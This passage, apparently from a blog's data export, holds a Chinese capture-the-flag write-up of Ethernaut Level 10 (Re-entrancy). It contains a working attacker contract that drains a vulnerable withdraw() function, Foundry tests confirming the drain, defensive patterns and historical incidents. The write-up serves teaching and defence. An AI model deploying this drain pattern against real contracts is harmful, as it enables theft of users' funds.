makeAddr(\"user1\");\n    address public user2 = makeAddr(\"user2\");\n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        reentrance = new Reentrance();\n        \n        // 给用户一些初始资金\n        vm.deal(user1, 10 ether);\n        vm.deal(user2, 10 ether);\n        vm.deal(attackerAddr, 2 ether);\n        \n        // 模拟正常用户存款\n        vm.prank(user1);\n        reentrance.donate{value: 5 ether}(user1);\n        \n        vm.prank(user2);\n        reentrance.donate{value: 5 ether}(user2);\n        \n        // 部署攻击合约\n        vm.prank(attackerAddr);\n        attacker = new ReentrancyAttacker(address(reentrance));\n    }\n\n    function testReentrancyAttack() public {\n        uint256 contractBalanceBefore = address(reentrance).balance;\n        uint256 attackerBalanceBefore = attackerAddr.balance;\n        \n        console.log(\"合约余额 (攻击前):\", contractBalanceBefore);\n        console.log(\"攻击者余额 (攻击前):\", attackerBalanceBefore);\n        \n        // 执行重入攻击\n        vm.prank(attackerAddr);\n        attacker.attack{value: 1 ether}();\n        \n        uint256 contractBalanceAfter = address(reentrance).balance;\n        uint256 attackerBalanceAfter = attacker.getBalance();\n        \n        console.log(\"合约余额 (攻击后):\", contractBalanceAfter);\n        console.log(\"攻击者余额 (攻击后):\", attackerBalanceAfter);\n        \n        // 验证攻击成功\n        assertEq(contractBalanceAfter, 0);\n        assertGt(attackerBalanceAfter, 1 ether); // 获得超过投入的资金\n    }\n    \n    function testReentrancyDetails() public {\n        vm.prank(attackerAddr);\n        \n        // 记录每次withdraw调用\n        vm.recordLogs();\n        attacker.attack{value: 1 ether}();\n        \n        // 验证攻击者的余额记录\n        assertEq(reentrance.balanceOf(address(attacker)), 0); // 最终余额为0\n        assertEq(address(reentrance).balance, 0); // 合约被掏空\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行重入攻击测试\nforge test --match-contract ReentranceTest -vvv\n\n# 输出应该显示合约余额被完全掏空\n```\n\n## 🛡️ 防御措施\n\n### 1. CEI 模式 (Check-Effects-Interactions)\n\n```solidity\ncontract SecureReentrance {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public {\n        // ✅ 检查 (Check)\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        // ✅ 效果 (Effect) - 先更新状态\n        balances[msg.sender] -= _amount;\n        \n        // ✅ 交互 (Interaction) - 最后进行外部调用\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 2. 重入锁 (Reentrancy Guard)\n\n```solidity\ncontract ReentrancyGuarded {\n    bool private locked;\n    mapping(address => uint) public balances;\n    \n    modifier noReentrant() {\n        require(!locked, \"Reentrant call\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    \n    function withdraw(uint _amount) public noReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 3. 使用 OpenZeppelin 的 ReentrancyGuard\n\n```solidity\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract SafeContract is ReentrancyGuard {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public nonReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 4. 使用 transfer() 而非 call()\n\n```solidity\n// ⚠️ 有限防护（不推荐作为唯一防护措施）\nfunction withdraw(uint _amount) public {\n    require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _amount;\n    payable(msg.sender).transfer(_amount); // 限制 Gas 为 2300\n}\n```\n\n## 📚 核心知识点\n\n### 1. 重入攻击类型\n\n| 类型 | 描述 | 示例 |\n|------|------|------|\n| **单函数重入** | 攻击同一个函数 | 本关卡的 `withdraw()` |\n| **跨函数重入** | 攻击不同函数 | `withdraw()` → `transfer()` |\n| **跨合约重入** | 攻击不同合约 | DeFi 协议间的复杂重入 |\n\n### 2. Gas 限制对比\n\n```solidity\n// transfer/send: 2300 gas (不足以进行重入)\npayable(msg.sender).transfer(amount);\n\n// call: 转发所有剩余 gas (可能导致重入)\n(bool success,) = msg.sender.call{value: amount}(\"\");\n```\n\n### 3. 状态更新时序\n\n```solidity\n// ❌ 错误模式\nfunction vulnerable() public {\n    require(condition);        // Check\n    externalCall();           // Interaction (危险!)\n    updateState();            // Effect (太晚了)\n}\n\n// ✅ 正确模式\nfunction secure() public {\n    require(condition);        // Check\n    updateState();            // Effect (先更新状态)\n    externalCall();           // Interaction (安全)\n}\n```\n\n## 🏛️ 历史案例\n\n### The DAO 攻击 (2016年6月)\n\n- **损失**: 360万 ETH (当时价值约6000万美元)\n- **原因**: splitDAO 函数存在重入漏洞\n- **后果**: 以太坊硬分叉，产生 ETH 和 ETC\n- **教训**: 重入攻击的破坏性和防护重要性\n\n### 其他著名案例\n\n1. **Cream Finance** (2021) - 1.3亿美元损失\n2. **bZx Protocol** (2020) - 多次重入攻击\n3. **Uniswap V1** (早期版本) - 理论漏洞\n\n## 🎯 总结\n\n重入攻击是智能合约安全的基石知识：\n\n- ✅ **理解 CEI 模式的重要性**\n- ✅ **掌握多种防护措施的使用**\n- ✅ **认识状态管理的关键性**\n- ✅ **学习历史案例的教训**\n\n重入攻击看似简单，但其变种和组合形式在现代 DeFi 协议中仍然是主要威胁。掌握其原理和防护措施是每个智能合约开发者的必修课。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[下一关: Level 11 - Elevator](/2025/01/25/ethernaut-level-11-elevator/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*安全的合约不仅要做正确的事，还要以正确的顺序做事。* 🔐","slug":"ethernaut-level-10-reentrancy","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp9000wbf5qb8kma8or","content":"<h1 id=\"🎯-Ethernaut-Level-10-Re-entrancy-经典重入攻击详解\"><a href=\"#🎯-Ethernaut-Level-10-Re-entrancy-经典重入攻击详解\" class=\"headerlink\" title=\"🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解\"></a>🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/10\">Ethernaut Level 10 - Re-entrancy</a><br><strong>攻击类型</strong>: 重入攻击 (Reentrancy Attack)<br><strong>难度</strong>: ⭐⭐⭐⭐☆<br><strong>历史影响</strong>: The DAO 攻击事件 (2016年)</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这是智能合约安全领域最经典的攻击类型之一：</p>\n<ol>\n<li><strong>窃取合约资金</strong> - 提取超过自己存款金额的以太币</li>\n<li><strong>理解重入原理</strong> - 掌握状态更新时序问题</li>\n<li><strong>学习防护措施</strong> - 了解如何编写安全的提款函数</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.12;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Reentrance &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  using SafeMath for uint256;</span><br><span class=\"line\">  mapping(address =&gt; uint) public balances;</span><br><span class=\"line\"></span><br><span class=\"line\">  function donate(address _to) public payable &#123;</span><br><span class=\"line\">    balances[_to] = balances[_to].add(msg.value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class=\"line\">    return balances[_who];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 🚨 漏洞函数</span><br><span class=\"line\">  function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">      if(result) &#123;</span><br><span class=\"line\">        balances[msg.sender] -= _amount;  // ❌ 状态更新在外部调用之后</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p>重入攻击的根本原因是 <strong>检查-效果-交互 (CEI)</strong> 模式的违反：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    // ✅ 检查 (Check)</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ❌ 交互 (Interaction) - 过早进行外部调用</span><br><span class=\"line\">        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if(result) &#123;</span><br><span class=\"line\">            // ❌ 效果 (Effect) - 状态更新太晚</span><br><span class=\"line\">            balances[msg.sender] -= _amount;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><ol>\n<li><strong>恶意合约存款</strong> - 向目标合约存入少量资金</li>\n<li><strong>调用提款函数</strong> - 触发 <code>withdraw()</code> 函数</li>\n<li><strong>接收回调</strong> - 在 <code>call</code> 执行时触发恶意合约的 <code>receive()</code> 函数</li>\n<li><strong>递归调用</strong> - 在状态更新前再次调用 <code>withdraw()</code></li>\n<li><strong>重复提取</strong> - 由于余额未更新，可以多次提取资金</li>\n</ol>\n<h3 id=\"攻击流程图\"><a href=\"#攻击流程图\" class=\"headerlink\" title=\"攻击流程图\"></a>攻击流程图</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用户调用 withdraw(1 ether)</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">检查 balances[attacker] &gt;= 1 ether ✅</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">发送 1 ether 到攻击者合约</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">攻击者合约的 receive() 被触发</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">再次调用 withdraw(1 ether)</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">检查 balances[attacker] &gt;= 1 ether ✅ (余额未更新!)</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">再次发送 1 ether...</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">如此重复，直到合约余额耗尽</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Reentrance.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentrancyAttacker &#123;</span><br><span class=\"line\">    Reentrance public target;</span><br><span class=\"line\">    uint public amount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Reentrance(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() external payable &#123;</span><br><span class=\"line\">        amount = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤1: 先存入一些资金建立余额</span><br><span class=\"line\">        target.donate&#123;value: amount&#125;(address(this));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤2: 开始重入攻击</span><br><span class=\"line\">        target.withdraw(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 重入攻击的核心 - receive函数</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        if (address(target).balance &gt;= amount) &#123;</span><br><span class=\"line\">            // 递归调用withdraw，实现重入</span><br><span class=\"line\">            target.withdraw(amount);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getBalance() public view returns (uint) &#123;</span><br><span class=\"line\">        return address(this).balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentranceTest is Test &#123;</span><br><span class=\"line\">    Reentrance public reentrance;</span><br><span class=\"line\">    ReentrancyAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user1 = makeAddr(&quot;user1&quot;);</span><br><span class=\"line\">    address public user2 = makeAddr(&quot;user2&quot;);</span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        reentrance = new Reentrance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给用户一些初始资金</span><br><span class=\"line\">        vm.deal(user1, 10 ether);</span><br><span class=\"line\">        vm.deal(user2, 10 ether);</span><br><span class=\"line\">        vm.deal(attackerAddr, 2 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 模拟正常用户存款</span><br><span class=\"line\">        vm.prank(user1);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.prank(user2);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user2);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new ReentrancyAttacker(address(reentrance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testReentrancyAttack() public &#123;</span><br><span class=\"line\">        uint256 contractBalanceBefore = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceBefore = attackerAddr.balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;合约余额 (攻击前):&quot;, contractBalanceBefore);</span><br><span class=\"line\">        console.log(&quot;攻击者余额 (攻击前):&quot;, attackerBalanceBefore);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行重入攻击</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        uint256 contractBalanceAfter = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceAfter = attacker.getBalance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;合约余额 (攻击后):&quot;, contractBalanceAfter);</span><br><span class=\"line\">        console.log(&quot;攻击者余额 (攻击后):&quot;, attackerBalanceAfter);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(contractBalanceAfter, 0);</span><br><span class=\"line\">        assertGt(attackerBalanceAfter, 1 ether); // 获得超过投入的资金</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testReentrancyDetails() public &#123;</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 记录每次withdraw调用</span><br><span class=\"line\">        vm.recordLogs();</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击者的余额记录</span><br><span class=\"line\">        assertEq(reentrance.balanceOf(address(attacker)), 0); // 最终余额为0</span><br><span class=\"line\">        assertEq(address(reentrance).balance, 0); // 合约被掏空</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行重入攻击测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract ReentranceTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出应该显示合约余额被完全掏空</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-CEI-模式-Check-Effects-Interactions\"><a href=\"#1-CEI-模式-Check-Effects-Interactions\" class=\"headerlink\" title=\"1. CEI 模式 (Check-Effects-Interactions)\"></a>1. CEI 模式 (Check-Effects-Interactions)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureReentrance &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">        // ✅ 检查 (Check)</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ✅ 效果 (Effect) - 先更新状态</span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ✅ 交互 (Interaction) - 最后进行外部调用</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-重入锁-Reentrancy-Guard\"><a href=\"#2-重入锁-Reentrancy-Guard\" class=\"headerlink\" title=\"2. 重入锁 (Reentrancy Guard)\"></a>2. 重入锁 (Reentrancy Guard)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ReentrancyGuarded &#123;</span><br><span class=\"line\">    bool private locked;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier noReentrant() &#123;</span><br><span class=\"line\">        require(!locked, &quot;Reentrant call&quot;);</span><br><span class=\"line\">        locked = true;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        locked = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public noReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-使用-OpenZeppelin-的-ReentrancyGuard\"><a href=\"#3-使用-OpenZeppelin-的-ReentrancyGuard\" class=\"headerlink\" title=\"3. 使用 OpenZeppelin 的 ReentrancyGuard\"></a>3. 使用 OpenZeppelin 的 ReentrancyGuard</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract is ReentrancyGuard &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public nonReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-使用-transfer-而非-call\"><a href=\"#4-使用-transfer-而非-call\" class=\"headerlink\" title=\"4. 使用 transfer() 而非 call()\"></a>4. 使用 transfer() 而非 call()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ⚠️ 有限防护（不推荐作为唯一防护措施）</span><br><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _amount;</span><br><span class=\"line\">    payable(msg.sender).transfer(_amount); // 限制 Gas 为 2300</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-重入攻击类型\"><a href=\"#1-重入攻击类型\" class=\"headerlink\" title=\"1. 重入攻击类型\"></a>1. 重入攻击类型</h3><table>\n<thead>\n<tr>\n<th>类型</th>\n<th>描述</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>单函数重入</strong></td>\n<td>攻击同一个函数</td>\n<td>本关卡的 <code>withdraw()</code></td>\n</tr>\n<tr>\n<td><strong>跨函数重入</strong></td>\n<td>攻击不同函数</td>\n<td><code>withdraw()</code> → <code>transfer()</code></td>\n</tr>\n<tr>\n<td><strong>跨合约重入</strong></td>\n<td>攻击不同合约</td>\n<td>DeFi 协议间的复杂重入</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-Gas-限制对比\"><a href=\"#2-Gas-限制对比\" class=\"headerlink\" title=\"2. Gas 限制对比\"></a>2. Gas 限制对比</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// transfer/send: 2300 